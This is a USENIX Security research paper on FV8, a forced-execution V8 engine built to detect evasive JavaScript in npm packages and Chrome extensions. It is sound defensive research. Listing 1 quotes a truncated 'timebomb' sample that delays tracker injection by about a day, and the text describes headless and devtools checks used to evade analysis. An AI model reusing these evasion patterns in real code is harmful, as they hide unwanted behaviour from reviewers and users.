@@ -1,0 +1,1172 @@
+      FV8: A Forced Execution JavaScript Engine
+          for Detecting Evasive Techniques
+Nikolaos Pantelaios and Alexandros Kapravelos, North Carolina State University
+      https://www.usenix.org/conference/usenixsecurity24/presentation/pantelaios
+
+
+
+
+        This paper is included in the Proceedings of the
+               33rd USENIX Security Symposium.
+                  August 14–16, 2024 • Philadelphia, PA, USA
+                                  978-1-939133-44-1
+
+
+
+
+                                         Open access to the Proceedings of the
+                                           33rd USENIX Security Symposium
+                                               is sponsored by USENIX.
+    FV8: A Forced Execution JavaScript Engine for Detecting Evasive Techniques
+
+                          Nikolaos Pantelaios                           Alexandros Kapravelos
+                     North Carolina State University                North Carolina State University
+
+
+
+
+                          Abstract                                 into malicious JavaScript code underscores the close connec-
+                                                                   tion between malicious code and evasion techniques. Evasion
+   Evasion techniques allow malicious code to never be ob-
+                                                                   techniques are widespread; in 2023, at least four of the top
+served. This impacts significantly the detection capabilities
+                                                                   10 malware families incorporate some form of evasion [27].
+of tools that rely on either dynamic or static analysis, as they
+                                                                   Recent research reveals that 25% of all malicious JavaScript
+never get to process the malicious code. The dynamic na-
+                                                                   code is obfuscated to avoid detection [22], in stark contrast to
+ture of JavaScript, where code is often injected dynamically,
+                                                                   the Alexa top 20,000 websites, where only 0.5% of the code
+makes evasions particularly effective. Yet, we lack tools that
+                                                                   is obfuscated. Malicious npm packages are demonstrating
+can detect evasive techniques in a challenging environment
+                                                                   increased sophistication, with recent packages featuring eva-
+such as JavaScript.
+                                                                   sive techniques not present in earlier malicious versions [17].
+   In this paper, we present FV8, a modified V8 JavaScript         Recent instances of malicious browser extensions include at
+engine designed to identify evasion techniques in JavaScript       least one form of advanced anti-detection evasion [15]. Even
+code. FV8 selectively enforces code execution on APIs that         phishing kits now come equipped with their own built-in eva-
+conditionally inject dynamic code, thus enhancing code cov-        sive tactics [24]. As demonstrated by CrawlPhish [64], a tool
+erage and consequently improving visibility into malicious         designed to identify evasions in phishing pages, JavaScript-
+code. We integrate our tool in both the Node.js engine and         based evasion techniques are growing in complexity, encom-
+the Chromium browser, compelling code execution in npm             passing methods like bot detection cloaking, user fingerprint-
+packages and Chrome browser extensions. Our tool increases         ing, and user interaction.
+code coverage by 11% compared to default V8 and detects
+                                                                      Our tool, FV8 (pronounced as "favorite"), built on top of
+28 unique evasion categories, including five previously unre-
+                                                                   Chromium’s V8 JavaScript engine, can detect evasions both
+ported techniques. In data confirmed as malicious from both
+                                                                   in Node.js and Chromium environments and even account for
+ecosystems, our tool identifies 1,443 (14.6%) npm packages
+                                                                   dynamic code injection, applying forced code execution se-
+and 164 (82%) extensions containing at least one type of eva-
+                                                                   lectively and recursively. Detecting evasions provides greater
+sion. In previously unexamined extensions (39,592), our tool
+                                                                   code coverage and can potentially reveal more malicious code.
+discovered 16,471 injected third-party scripts, and a total of
+                                                                   This is necessary to strengthen defenses against malicious
+8,732,120 lines of code executed due to our forced execution
+                                                                   code across multiple JavaScript ecosystems.To showcase its
+instrumentation. Furthermore, it tagged a total of 423 exten-
+                                                                   evasion detection capabilities, we use our tool in conjuction
+sions as both evasive and malicious and we manually verify
+                                                                   with browser extensions and npm packages due to their his-
+110 extensions (26%) to actually be malicious, impacting two
+                                                                   tory of previous malicious incidents, their evasion capabilities
+million users. Our tool is open-source and serves both as an
+                                                                   as well as the diverse range of JavaScript functionality they
+in-browser and standalone dynamic analysis tool, capable of
+                                                                   provide.
+detecting evasive code, bypassing obfuscation in certain cases,
+offering improved access to malicious code, and supporting            Previous research in both ecosystems has encompassed
+recursive analysis of dynamic code injections.                     (1) in-browser tools, (2) dynamic analysis tools employed
+                                                                   outside the browser and (3) static analysis tools, including
+                                                                   JAW [44] proposed by Khodayari et al., JStap, DoubleX and
+1   Introduction                                                   HideNoSeek [33–35] proposed by Fass et al., as well as Em-
+                                                                   PoWeb by Somé [58].
+"The code is heavily obfuscated and contains many anti-               Indeed, while these established tools offer valuable con-
+debugging and anti-analysis traps." [15]. This recent insight      tributions, they may have limitations when considered in-
+
+
+
+USENIX Association                                                                    33rd USENIX Security Symposium         3747
+dividually. Notably, the tools from category (1) exhibit the       1     // tracker added on timebomb
+following characteristics: JSForce [37] modified the Spider-       2     var _paq = (window._paq = window._paq || []);
+Monkey engine in Mozilla Firefox and J-Force [45] focused          3     /* tracker methods like "setCustomDimension" should be
+on Safari, but neither of these tools is publicly available nor           called before "trackPageView" */
+                                                                   4     _paq.push(['trackPageView']);
+are related to the V8 engine, which is the basis for multiple      5     _paq.push(['enableLinkTracking']);
+environments including the most popular browser by mar-            6     (function () { setTimeout(() => {
+ket share (Chrome) [3]. Moreover, both of these tools prior-       7         chrome.storage.local.get('extensionId', function (
+itize executing as many paths as possible, while in contrast,             result) {
+FV8 emphasizes the examination of APIs per block for detect-        8            var u = 'https://matomo.debank.com/';
+ing evasions, employing targeted forced execution based on          9            [..]
+                                                                   10            g.src = '/vendor/matomo.client.js';
+specific conditions for improved performance. Furthermore,
+                                                                   11            s.parentNode.insertBefore(g, s); });
+Rozzle [47], while designed to detect malware using symbolic       12        }, 93445000); })();
+execution in combination with targeting specific APIs, was
+built upon deprecated browser and APIs (Internet Explorer                Listing 1: Timebomb evasion example (non-obfuscated).
+and ActiveX API), and its implementation is not open-sourced
+or reproducible.                                                   of 39,592 extensions and 9,899 malicious npm packages and
+   In the context of dynamic analysis tools from category          demonstrate the tool’s effectiveness in detecting a wide array
+(2), Iroh.js [10] is a dynamic code analysis tool outside          of evasion techniques in multiple environments. Overall, we
+the browser that intercepts runtime information. Meanwhile         detect a total of 28 unique evasion categories being part of
+Jalangi [11] is a dynamic analysis tool decoupled for the          the following evasion groups: Login, Timebombs, Fingerprint,
+browser mainly for runtime analysis of the JavaScript pro-         User Interaction, Website Check and Other. FV8 identifies
+gram. However, none of these tools can recursively handle the      1,443 (14.6%) npm packages and 164 (82%) extensions con-
+loading of code injections that occur within the in-browser        taining at least one type of evasion, in data previously verified
+environment as they are based on interceptions, which makes        as malicious. In extensions collected from the wild, which
+recursion more difficult.                                          were previously unseen, we perform manual checks on the
+   Finally, the static analysis tools in category (3) share a      extensions flagged by our system to verify their malicious na-
+common limitation—they fail to detect the existence of mali-       ture. Our manual verification process relies on the number of
+cious code that dynamically loads under specific conditions        forced executions triggered by our system as well as checking
+(evasion techniques). One notable example of behavior that         the dynamically injected code from the VV8 logs, verifying
+these tools might overlook is the "timebomb" evasion code.         a total of 82 extensions as malicious. Finally, the use of the
+A "timebomb" is a type of malicious behavior that remains          DBSCAN clustering algorithm [6], further enhances our capac-
+hidden until a specific duration has elapsed, an evasion tactic    ity to cluster and identify additional evasion techniques and
+that can be found even in recent malicious code samples [26].      malicious extensions. We use the code related to the already
+In this non-obfuscated code example provided in Listing 1,         found evasions as input features and we flag an additional 28
+we can see that the extension initiates a tracker after approxi-   extensions that way, for a total of 110 malicious extensions.
+mately one day has elapsed. In order to observe the internal       The entire system encompassing the crawler, Chromium and
+code’s execution we need a way to enforce the execution of         Node.js is named ATRES (API-Targeted Recursive Execu-
+the setTimeout code. This is precisely where our tool, FV8,        tion System) and a detailed understanding of the complete
+proves to be valuable. It allows us to trigger forced execu-       architecture can be found in Figure 1.
+tions, enabling us to reveal hidden malicious behavior that           Our paper makes the following contributions:
+loads dynamically based on conditions, that would otherwise
+remain undetected using previous analysis techniques.                   • We introduce FV8, an innovative, open-source interpreter
+   Our system, FV8, is fundamentally designed for the de-                 based on V8, capable of inter-environment and inter-
+tection of JavaScript evasions. It offers an innovative ap-               dataset analysis of JavaScript. FV8 is designed for recur-
+proach centered around Chromium, Node.js, and the V8 en-                  sive forced execution of JavaScript, even for dynamically
+gine, ensuring reproducibility and openness as it is open-                loaded code, for the detection of evasions. It stands as the
+sourced. Our approach involves patching Chromium (exten-                  first tool to encompass all these aforementioned features
+sions) and Node.js (npm packages) with FV8 first and Vis-                 simultaneously.
+ibleV8 (VV8) [40] afterwards, for comprehensive code ex-                • We successfully identify 28 evasion techniques in 1, 443
+ecution visibility. Our system identifies and flags data with             npm packages and 274 browser extensions, including
+the highest number of triggered forced executions based on                five techniques that we are the first to report, ie. password
+our instrumentation. The approach minimizes overhead by                   path exists in npm packages and crypto wallet connected.
+selectively targeting specific condition branches that contain
+APIs. Our experiments involve extensive testing using a total           • Our tool automatically executes detected evasions which
+
+
+
+3748    33rd USENIX Security Symposium                                                                          USENIX Association
+                             npm Evasion
+                           Detection Module
+
+                                                             Post-processing Module                      DBSCAN Expansion Module
+                                 Docker
+
+    Malicious npm
+         (D1)                                            FV8 logs
+                           Forced Execution                                   Manual          D3   Evasion Category
+                                 Node.js                                     Verification                                     DBSCAN
+                                                                                                        to API
+                                                         VV8 logs
+
+                             Extension
+                          Detection Module
+
+       Malicious                             Catapult
+                        Docker   Puppeteer
+                                                        Evasive      Evasive      Malicious                       Malicious
+    Extensions (D2)                           WPR
+                                                         npm        Extensions   Extensions                      Extensions
+      Extensions           Forced Execution
+    in the wild (D3)             Chromium
+
+
+
+
+Figure 1: Full architecture consisting of 1 npm Evasion Detection Module, 2 Extension Detection Module, 3 Post-Processing Module and
+the 4 DBSCAN Expansion Module. These four components, and the resulting flagging of data, collectively define ATRES as a system.
+
+
+       resulted in more than 11 million LoC and 24,140 new               2.2     VisibleV8
+       dynamically loaded scripts to be executed that would
+       otherwise remain invisible to a detection system.                 VisibleV8 (VV8) is a system built on V8 [40] that enhances
+                                                                         visibility into executed JavaScript code within the Chromium
+     • We detect 110 extensions as malicious using our FV8               engine. The system generates log files that record data on
+       instrumentation and the DBSCAN algorithm as post-                 which scripts were executed and which specific APIs were
+       processing, which we report to Google. Subsequently,              involved in the execution process. This tool proves invaluable
+       62.7% (69/110) of these extensions have been success-             for overcoming obfuscation techniques and gaining insights
+       fully removed from the platform.                                  into the executed code, whether malicious or not. VisibleV8
+                                                                         has been integrated with multiple systems in the past, show-
+     • We open-source our tool as per-version patches, tested in         casing its versatility and utility [41, 55]. Its compatibility with
+       the latest 28 versions of V8 and Chromium, ranging from           FV8 patches for Chromium adds value, as both systems share
+       version 94 to the latest version 122, making it the first         a per-version patch approach. In our experiments, we combine
+       open-source and maintainable forced-execution solution            VisibleV8, FV8 and a custom-built crawler, gaining improved
+       for JavaScript.                                                   visibility into executed APIs, examining code from forced
+                                                                         executions, and efficiently post-processing results to identify
+                                                                         evasive techniques and malicious behavior.
+2      Background
+
+2.1      V8 & Chromium                                                   2.3     WebStore & Extensions
+The web heavily relies on JavaScript, with Chrome being the              The Chrome Web Store, hosting over 200,000 active exten-
+most widely used browser with a market share of 62.55% [2],              sions [4], follows strict internal vetting procedures to ensure
+while Chromium is the open-source alternative without the                quality and security. Extensions failing to meet criteria are
+proprietary software and V8 is the JavaScript engine of choice           rejected. Since 2023, all extensions must comply with Mani-
+for both. V8 is an open-source, high-performance JavaScript              fest V3 guidelines, mandating code bundling and prohibiting
+and WebAssembly engine developed by Google and written                   third-party code injections for more rigorous vetting.
+in C++. It serves as the engine behind Chrome and Node.js,                  However, our findings reveal that this assumption of com-
+among other applications. It can be used as a standalone                 plete security is not always accurate, as some bundled ex-
+engine or embedded into any C++ application. Chromium                    tensions employ obfuscation techniques. Our focus remains
+utilizes V8 as its JavaScript interpreter, making it the engine          on extensions with third-party inclusions. Manifest V3 em-
+of choice for executing a substantial amount of JavaScript               phasizes user review of requested permissions, defined in
+code across the web and Node.js. Therefore, we decided to                manifest.json. Extensions consist of service workers (back-
+focus on patching and modifying V8, given its widespread                 ground scripts in Manifest V2) and content scripts with varied
+usage and critical role in handling JavaScript execution.                APIs. Despite limitations, content scripts can inject code into
+
+
+
+USENIX Association                                                                            33rd USENIX Security Symposium           3749
+web pages from local files, the injection bundle, or third-party      Dataset                Data         Malicious Code De-
+resources. This capability poses potential browser security                                  Type         Data      tection
+risks.
+                                                                      D1: Malicious          npm                      evasion
+                                                                                                          Y
+                                                                      npm [23]               packages
+2.4    Node.js & npm ecosystem
+                                                                      D2: Malicious          browser                  evasion
+                                                                                                        Y
+The Node.js ecosystem has emerged as a pivotal platform for           extensions [8]         extensions
+server-side JavaScript development, fostering an expansive
+                                                                      D3: Extensions         browser                  Malicious
+and dynamic software landscape, with more than 2.53 mil-                                                N/A
+                                                                      in the wild            extensions               & evasion
+lion npm packages in the main npm registry as of October
+2023 [21]. At its core lies npm (Node Package Manager), a
+                                                                    Table 1: The three datasets used and their main characteristics.
+powerful package management system that has revolution-
+ized the way developers create, share, and maintain software
+libraries and tools. npm’s vast repository boasts millions of         In total, we collected data to create three distinct datasets.
+open-source packages, each contributing to the ecosystem’s         Two of these datasets comprise extensions from the Chrome
+robustness and versatility. This ecosystem’s rise can be at-       Web Store, while the third contains npm packages. The data
+tributed to the ease with which developers can leverage and        falls into two categories: the first consists of previously
+distribute packages, making it a cornerstone of modern web         flagged malicious data, while the second consists of data gath-
+and application development.                                       ered from the wild, which may or may not be malicious. We
+   However, it is important to recognize that this interconnect-   denote these datasets as Malicious npm Packages or D1, Ma-
+edness introduces a potential vulnerability, as the ecosystem is   licious Extensions or D2, and Extensions in the Wild or D3.
+only as robust as its weakest link. A single outdated or poorly       Malicious npm Packages (D1) represents the npm package
+maintained package deep within the dependency tree can pose        dataset and contains verified malicious packages. We sourced
+significant security risks and hinder overall system stability.    this data from reports in the OSV database [23], resulting in a
+Therefore it is crucial to employ comprehensive tools for both     total of 12, 000 hashes, each corresponding to an npm package
+static and dynamic package analysis, with FV8 standing as an       flagged by their system over the past four years. Notably, this
+additional layer of defense in detecting evasive code in npm.      database includes both malicious and vulnerable packages,
+                                                                   and we focus exclusively on malicious packages based on
+2.5    Relevant Technologies                                       their descriptions.
+                                                                      Malicious Extensions (D2) is a dataset gathered from previ-
+Catapult - Web Page Replay [1] is a tool designed to record        ous malicious extension reports from the past seven years [8].
+and replay web page requests, reducing network traffic and         This collection comprises hashes of extensions organized
+maintaining consistency in JavaScript execution across multi-      based on significant incidents within the malicious ecosystem.
+ple visits. This enhances experiment repeatability and enables     These malicious extensions were originally identified mostly
+precise web page analysis.                                         by security companies such as Kaspersky [13] and Avast [14].
+   Puppeteer [25] is a Node.js library for controlling Chrome      Furthermore, almost all of these extensions have already been
+and Chromium browsers, ideal for tasks like web scraping, test     removed from the Chrome Web Store, which serves as an
+automation, and screenshot generation. We selected Puppeteer       additional validation of their malicious nature. This dataset
+for our Chrome-focused experiments due to its efficiency.          offers detailed information on malicious extension packages
+   DBSCAN, a popular density-based clustering algorithm            and has been utilized in prior research, such as [31]. From this
+used in data mining and machine learning, groups data points       dataset, we selected the latest 200 extensions to demonstrate
+in high-density regions and identifies outliers as noise points.   our system’s functionality and to maintain comparability with
+Given its unsupervised learning nature, it is versatile and use-   malicious npm packages.
+ful in applications like code clustering and anomaly detection,       Lastly, Extensions in the Wild (D3) serves as a dataset to
+as it does not require pre-defined assumptions about the num-      demonstrate that FV8 can detect evasions not only in already
+ber of clusters.                                                   flagged malicious data but also in data from the wild. To
+                                                                   create this dataset, we gathered extensions from the Web
+3     Data                                                         Store [4], totaling approximately 200, 000, with around 400
+                                                                   new or updated extensions uploaded daily. For a more concise
+To conduct our experiments, we needed a diverse set of data.       overview of the data, please refer to Table 1.
+Leveraging the versatility of our tool, which operates on multi-      It is essential to note that our sources for D1 and D2 only
+ple V8-based systems, we applied patches to both Chromium          provide hashes of malicious data. To locate the actual source
+and Node.js, allowing us to execute code within browser ex-        code, we maintain two historical datasets spanning the past
+tensions and npm packages.                                         four and nine years respectively, which contain daily crawling
+
+
+
+3750    33rd USENIX Security Symposium                                                                        USENIX Association
+      API Category           API Name            API Base                             Category              AST Node Type
+                             setTimeout               -                                                        IfStatement
+         Timing
+                             setInterval              -                              Conditionals              Conditional
+                               append             Element                                                   SwitchStatement
+                               prepend            Element                                                  DoWhileStatement
+    DOM Manipulation         insertAfter          Element                                                   WhileStatement
+                            insertBefore          Element                        Iteration Conditions         ForStatement
+                            appendChild           Element                                                    ForInStatement
+       Networking               fetch                 -                                                     ForOfStatement
+                                 eval                 -                                                    Binary (2-elements)
+     Code Generation
+                              Function        Constructor (new)                  Ternary Conditions        Unary (1-element)
+                                                                                                           Nary (N-elements)
+Table 2: List of APIs injecting 3rd-party code in browser extensions.           Exception Conditions       TryCatchStatement
+
+                                                                         Table 3: JavaScript AST type nodes that were patched inside V8.
+records. These records include the majority of npm packages
+and extensions, even those already taken down, and we match
+the hashes from our datasets with this historical data to create        proach, first identifying APIs and then retracing to locate the
+the actual malicious datasets.                                          triggering condition, is hindered by the engine’s structure and
+   Specifically, our extension crawler performs daily crawls            decision-making process. To ensure effective code execution,
+of the Web Store, downloading all extensions that have under-           we’ve devised a recursive system that handles both the initial
+gone version updates and any newly introduced extensions.               code and dynamically injected third-party code.
+During this process, we also gather additional information                 To implement this recursive execution system, we establish
+for each extension, including the number of users who have              several key functionalities. Firstly, we develop the capability
+downloaded it up to the time of the download, its category, its         to identify conditions, serving as starting points for exploring
+rating and the number of active users which we use later to             the AST. These condition type nodes cover all types of condi-
+measure the impact of our flagged extensions in D2 and D3.              tions supported by the JavaScript language, including if-else
+                                                                        statements, for-loop conditions, while-loop conditions, and
+                                                                        more. Out of the 56 different node types in JavaScript that
+4     Methodology                                                       V8 can parse, we specifically patch a total of eight AST node
+                                                                        types associated with conditions. For a comprehensive list of
+4.1     Modifying V8                                                    these condition node types, please refer to Table 3.
+The V8 engine, a vital component of the Chrome browser,                    Subsequently, when parsing a node belonging to these eight
+acts as an interpreter for JavaScript code in the browser. It           condition node types, we utilize a Depth-First Search (DFS)
+reads and executes all JavaScript code.                                 recursion algorithm to navigate through the inner included
+    Since the V8 engine code is open-sourced, we find the               block. This involves iteratively visiting the corresponding
+places in the V8 engine where it reads the code, and we make            AST nodes within that block. To facilitate this traversal, we
+changes in those places. We have to decide when to make                 devise our own DFS approach, executing child nodes itera-
+these changes: during code parsing or during the bytecode               tively and recursively until either all nodes have been executed
+generation process. If we make changes after code parsing,              or a predefined upper limit on the number of nodes is reached.
+it is too late, as V8 removes any code that has already been            Throughout this process, we thoroughly examine each node
+parsed, to make things faster. So, we choose to make changes            within the AST to identify the presence of any of the recog-
+while the code is being read and transformed into an Abstract           nized APIs detailed in Table 2.
+Syntax Tree (AST) format. This way, we have access to the                  To avoid infinite loops or handling excessively large code
+entire code without losing any parts.                                   segments, we set a node limit of 500 nodes visited for each
+    In V8 patching, the primary objective is to identify a trig-        DFS process. This practical constraint ensures performance
+gering condition within the code. We check if this code in-             efficiency and introduces minimal overhead. It also effectively
+corporates any of the APIs listed in Table 2, responsible for           covers the vast majority of test cases, as previous research sug-
+dynamic code injection. If these APIs are found, we include             gests that APIs requiring forced execution generally appear
+the entire block for forced execution, generating additional            within the first 500 nodes of the AST [37]. Thus, incorporat-
+bytecode. Our choice of a forward traversal approach within             ing this limit is not only reasonable but also necessary for the
+the AST, moving from start to finish, is dictated by the V8             effective operation and reduced overhead of our system.
+engine’s operation, which determines its next read based on                Moreover, each function, and consequently each file and
+the current context. Conversely, attempting a backward ap-              script, generates a unique AST. Our approach requires the
+
+
+
+USENIX Association                                                                         33rd USENIX Security Symposium          3751
+      Initial code                                                               FV8 forced                          Final increased
+                                       Condition & API
+       coverage                                                                execution patch                       code coverage
+                                         detection
+
+
+
+
+   Figure 2: FV8 architecture: Our modified engine detects evasion conditions and targeted APIs and increases code coverage execution.
+
+
+ability to navigate between different ASTs. However, the gen-          the npm packages ecosystem, we need to incorporate a few
+eration of AST nodes does not follow the chronological order           more APIs that dynamically inject code and are specific to
+of their execution. For instance, if we have two functions, func-      npm. These additional APIs include: exec, execFile, execSync,
+tionA and functionB, and functionA calls functionB, there              spawnSync, and urlopen. As a result, we proceed to patch
+is a possibility that functionB’s AST has not been generated           Node.js version 20, which is the latest Long-Term Support
+when parsing functionA’s AST proceeds to invoke it. As a               (LTS) Node.js version [12].
+result, switching between ASTs becomes impossible, making                 To ensure the execution of as much npm code as possi-
+forced execution unachievable. To address this, enabling the           ble, we initiate a static analysis of the package.json file. This
+–no-lazy flag is crucial. This built-in JavaScript flag of V8          analysis allows us to identify all available installation and
+ensures the generation of all ASTs regardless of their exe-            execution commands associated with the packages. These
+cution order. This setting facilitates the navigation between          commands are stored in a dictionary indexed by the package
+AST trees, allowing connections not only within the same               name and are executed sequentially, with appropriate adapta-
+function scope but also across different function scopes and           tions to address associated challenges.
+even between distinct scripts.                                            While working with the D1 dataset, which comprises veri-
+   Finally, by extracting the code differences between the             fied malicious packages, we exercised meticulous precautions
+original V8 version and our FV8 modifications, we obtain a             when running these packages within our environment. Specifi-
+patch file containing the code diff. This patch file, known as         cally, we restricted their permissions to read-only access, with
+the FV8 patch, is similar but not identical for each version           the exception of a designated "/tmp" folder for storing VV8
+of V8. The total length of the FV8 patch is less than 300              logs. We executed these packages within a secure Docker con-
+C++ lines of code (LoC). A high-level architecture of FV8 is           tainer, enforced the presence of a non-privileged dummy user,
+depicted in Figure 2.                                                  disabled any potential privilege escalation, and implemented
+                                                                       a 10-minute timeout mechanism to ensure the termination of
+                                                                       all processes. These measures collectively safeguard our sys-
+4.2     npm Evasion Detection Module
+                                                                       tem against any manipulative, monitoring, or compromising
+All npm packages are subjected to our evaluation process               activities that malicious packages may attempt.
+through the npm Evasion Detection Module 1 and the re-
+sults of this module are forwarded to the Post-processing              4.3     Extension Detection Module
+Module 3 (§ 4.4). For this module, we utilize the data from
+"Malicious npm packages" (D1) dataset. We apply our per-               Every extension is processed through the Extension Detection
+version patches of FV8 to the V8 engine within Node.js and             Module 2 . This module is applied to two datasets, namely
+integrate the corresponding patches of VisibleV8 for the same          D2 and D3. The results of this module are being fed to the
+version, which we modify accoringly. VV8 is designed for the           Post-processing Module 3 (§ 4.4).
+V8 engine within Chromium. Therefore, we had to include                   To acquire the final modified browser, which will serve
+only the relevant components for the V8 engine of Node.js to           as the core of our experiments, we adhere to the following
+ensure a successful patch. This integration results in a fully         procedure. Similar to the Node.js patching, we select the most
+operational version of Node.js with the combined function-             recent version of Chromium, which, at the time of writing, is
+ality of both FV8 and VV8. Notably, this work represents               version 123. Afterwards, we apply the patches to the original
+the first known instance of patching VV8 with the Node.js              V8 engine, thereby replacing the default Chromium V8 en-
+platform and its internal V8 JavaScript engine.                        gine with our customized FV8 forced execution engine and
+   Regarding the APIs we patch in the npm evasion module,              then we apply the VV8 patches for that same version. Finally,
+a list of these APIs is presented in Table 2. These APIs are           we utilize this modified FV8 Chromium version as the foun-
+specifically curated for the extension ecosystem. However, for         dation for our extension crawler, enabling us to execute our
+
+
+
+3752     33rd USENIX Security Symposium                                                                           USENIX Association
+experiments effectively.                                            Extension pre-filtering
+                                                                    We select certain extensions from the D3 dataset based on
+                                                                    certain criteria. We select extensions that had at least one
+Puppeteer Crawler                                                   update within the past two years, starting from August 2021.
+                                                                    This timeframe was chosen due to the ongoing rollout of
+To conduct a thorough examination of our tool, we construct         Manifest V3, as the Chrome Web Store rolled out a plan in
+a crawler as a wrapper around our tool. This crawler utilizes       2021 to gradually stop supporting Manifest V2 [20]. Although
+the FV8 engine we developed and performs specific tasks             other browsers, such as Brave [18] and Firefox [19], have
+such as loading designated extensions, visiting predefined          pledged to maintain support for Manifest V2, our goal was to
+URLs, logging relevant data for further analysis, and storing       test as many extensions as possible that are compatible with
+the collected data in appropriate databases for subsequent          all browsers, hence the chosen time window.
+processing. The crawler is deployed in collaboration with               After narrowing down the extensions to those within the
+datasets D2 and D3, both of which contain extensions, because       past two years, we conduct further static checks to determine
+npm packages functionality is not URL-based.                        their suitability. Firstly, we deduplicate the extensions, re-
+   To build the crawler we leverage Puppeteer [25], a Node.js       taining only the latest version for each unique extension ID
+tool for driving the browser, to visit specific URLs and capture    when multiple versions existed within the two-year period.
+logs. The crawler is predominantly implemented in JavaScript,       Subsequently, we examine the manifest.json file of each ex-
+with some components written in GoLang for post-processing          tension to identify the URLs on which these extensions were
+tasks. Additionally, we utilize the bash scripting language and     allowed to run. If an extension runs on all URLs we keep
+employed Docker and Docker Compose to scale up jobs.                it. Additionally, we perform static analysis to ascertain if the
+                                                                    extensions utilized at least one API from our curated list of
+   To finalize the crawler we need to address global timeouts,
+                                                                    targeted APIs presented in Table 2. If an extension does not
+the –no-headless mode and the extension Manifest specifica-
+                                                                    run on all URLs and does not contain any of the targeted
+tion differences. To handle timeouts effectively, we incorpo-
+                                                                    APIs, we discard that extension. Consequently, from the ini-
+rated specific browser timeouts to ensure all jobs terminated
+                                                                    tial batch of approximately 200,000 extensions, we reduce
+on time, even in the event of a browser crash. Although such
+                                                                    the count to around 40,000. For extensions that could run on
+crashes occurred in less than 1% of all jobs, it was essential to
+                                                                    any URL, we test them using the crawler on 10 popular URLs
+terminate browser sessions to avoid exceeding the currently
+                                                                    because of the variety of features they include. These popular
+open browser limit, which was approximately 160 concurrent
+                                                                    websites were chosen due to their complex JavaScript and
+browsers in our system. On average, a job took 45-60 sec-
+                                                                    HTML DOM structures, allowing us to trigger a significant
+onds to complete, according to previous literature [40]. To
+                                                                    amount of extension code execution, given that specific code
+account for any potential delays, we add a final timeout of
+                                                                    segments within extensions are conditionally triggered based
+120 seconds to ensure all jobs that should have terminated
+                                                                    on certain circumstances. For extensions limited to specific
+did so. Additionally, we encountered a challenge with the
+                                                                    URLs, we execute them on the URLs defined in their man-
+–headless mode. According to Puppeteer’s official documen-
+                                                                    ifest.json file. As a result, we had 40,000 extensions with a
+tation, loading browser extensions in –headless mode is not
+                                                                    maximum of 10 URLs to test for each extension, resulting in
+supported. Consequently, we address this limitation by in-
+                                                                    a total of up to 400,000 jobs.
+troducing visual support to our Docker setup using the X11
+and Xvfb module [28], thereby replicating the behavior of
+the –no-headless mode. Furthermore, to ensure the execution         4.4    Post-Processing Module
+of the initial code in the extension, we incorporate a func-
+tion that simulates a "click" on the action button specified        Post-processing the logs
+in the manifest.json file, thereby initiating the corresponding     To minimize flagging data incorrectly as well as the volume
+action button script. Employing Puppeteer, we were able to          of data requiring manual inspection, we establish a criterion
+trigger the action button while accommodating discrepancies         for an entry to be considered "flagged" by our system. Specif-
+between extensions written in Manifest V2 and Manifest V3.          ically, an entry is flagged only if there have been at least five
+   Finally, due to the high volume of requests and jobs, we         forced executions throughout the entire execution of the job.
+take precautions to avoid rate limiting and ensure consistency      This threshold is set at five because the same APIs we employ
+between job runs. To achieve this, we employ the Catapult           for forcing code execution can also be used to locally inject
+Web Page Replay [1] system, as described in Section 2.5.            code. Local static analysis tools can access and analyze lo-
+This system allowed us to record commonly sent requests             cally injected code. The distinctive advantage of our tool is its
+and replay them as needed, while still effectively handling         capability to handle dynamically generated code. Therefore,
+requests sent for the first time and successfully receiving the     a threshold of five increases the chance we encounter at least
+responses.                                                          one instance of dynamic code injection.
+
+
+
+USENIX Association                                                                     33rd USENIX Security Symposium          3753
+   Subsequent to data collection, we parse the logs for each
+                                                                                 API representation             DBSCAN Clustering
+job to identify scripts injected through the extensions. These                                                                 Evasion
+                                                                      Extension1 1 0 0            1                           CategoryB
+scripts are identifiable by their initiators, which typically com-                                            Evasion
+                                                                                                             CategoryA
+                                                                      Extension2 1 1 0            0
+mence with "chrome-extension:extensionID". We conduct a
+recursive exploration of these injected scripts to identify any                          [..]
+additional injected scripts. For each script, we track the URLs
+                                                                                                                               Evasion
+                                                                      ExtensionN 0 1 1            1
+from which it was injected and determine whether the script                                                                   CategoryC
+
+was executed. This is the automated part of our tool, where
+extensions are flagged as evasive and potentially malicious.
+                                                                     Figure 3: DBSCAN clustering architecture based on evasion APIs.
+The results of this process are subsequently analyzed to verify
+evasion and malicious behavior.
+
+Manual Verification
+In the verification stage, manual inspection is carried out. We      malicious data and additional evasion techniques. After con-
+review all the extensions and npm packages that our system           ducting the initial Extension Detection Module in FV8 and
+has "flagged" as well as all the VV8 and FV8 logs collected for      identifying extensions with evasion techniques and malicious
+each of these flagged items. The verification process involves       behaviors, we analyze conditions and APIs used, mapping
+both evasion and maliciousness checks. It is important to note       them to specific evasion categories. We then utilize this pres-
+that we can only verify data as malicious in the D3 dataset,         ence of APIs as the input features of DBSCAN.
+as the other two datasets are already flagged as malicious.
+   For the evasion verification, we identify the flagged items          For instance, when a malicious actor attempts to evade de-
+based on aforementioned criteria, ie. the number of forced           tection by bots, they may employ a condition to check if the
+executions exceeding the threshold and dynamic injection.            browser is running in a headless environment or if there is a
+We then inspect the actual condition in the initial code bundle      graphical user interface (GUI) involved. One common method
+that triggered the flagging. If the condition aligns with known      to check for a GUI is by examining the browser window size,
+evasion methods from prior research or other evasions that           as a non-zero window size indicates the presence of a user
+exists, we label the data as evasive. This evasion verification      interface. In this case, the malicious code may use the win-
+process is applied to all three datasets.                            dow.height and window.width APIs to carry out this condition
+   The verification process for malicious code is exclusive to       check. Another evasion technique involves checking if the
+the D3 dataset, as the other two datasets have already been          user is an actual human by attempting to open the developer
+identified as malicious. Initially, we select all extensions that    tools window. Since bots, particularly in headless mode, are
+have been verified as having at least one evasion technique          unable to open the developer tools, this check is conducted
+in the previous step. Subsequently, we examine the actual            using the devtools API, specifically the devtools.network API.
+injected code in the forced execution logs, using data from          By applying a similar approach to other evasion categories,
+the dynamic sources in the VV8 logs. In cases where the              we can establish a comprehensive list of evasion techniques
+injected code is heavily obfuscated, we execute the extension        and the corresponding APIs that are related to the conditions
+in a controlled, isolated environment to monitor intercepted         used by these evasion techniques and we check the extensions
+requests, redirections, and overall behavior. This environment       for the presense of those APIs. Figure 3 illustrates the detailed
+ensures that no information can be collected from potentially        architecture of the DBSCAN Expansion Module, showcasing
+malicious actions. We then verify maliciousness based on             its design and functionality for detecting evasion categories
+known malicious behaviors documented in the literature. The          per cluster.
+data we flag in this step are both malicious and contain at
+least one evasion technique, as both verifications have been            During the API data collection, we focus solely on the
